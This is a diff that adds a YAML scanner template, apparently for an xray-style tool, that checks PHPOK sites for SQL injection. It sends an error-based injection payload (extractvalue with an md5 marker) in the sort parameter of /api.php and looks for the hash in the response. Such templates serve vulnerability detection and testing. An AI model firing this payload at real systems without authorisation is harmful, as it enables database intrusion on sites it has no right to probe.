@@ -1,0 +1,18 @@
+detail:
+  author: jinqi
+  links:
+  - https://github.com/jinqi520
+expression: r0()
+manual: true
+name: poc-yaml-phpok-sqli
+rules:
+  r0:
+    expression: response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
+    request:
+      cache: true
+      method: GET
+      path: /api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{r1}})))
+        --+
+set:
+  r1: randomInt(800000000, 1000000000)
+transport: http
